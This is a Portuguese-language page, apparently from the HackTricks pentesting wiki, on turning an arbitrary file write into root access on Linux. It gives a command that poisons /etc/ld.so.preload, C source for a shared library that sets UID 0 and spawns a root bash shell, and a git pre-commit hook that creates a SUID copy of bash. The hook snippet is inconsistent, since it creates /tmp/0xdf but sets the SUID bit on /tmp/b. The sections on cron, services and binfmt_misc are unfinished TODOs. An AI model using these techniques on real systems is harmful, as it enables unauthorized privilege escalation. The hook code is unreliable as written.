# Escrita Arbitrária de Arquivo para Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **binaries SUID**.\
Se você puder criá-lo ou modificá-lo, pode simplesmente adicionar um **caminho para uma biblioteca que será carregada** com cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git, como quando um commit é criado, um merge... Portanto, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **escrever na pasta `.git`**, isso pode ser usado para **privesc**.

Por exemplo, é possível **gerar um script** em um repositório git em **`.git/hooks`** para que ele seja sempre executado quando um novo commit é criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar qual tipo de arquivo. TODO: verifique os requisitos para abusar disso para executar um rev shell quando um tipo de arquivo comum estiver aberto.

{{#include ../../banners/hacktricks-training.md}}
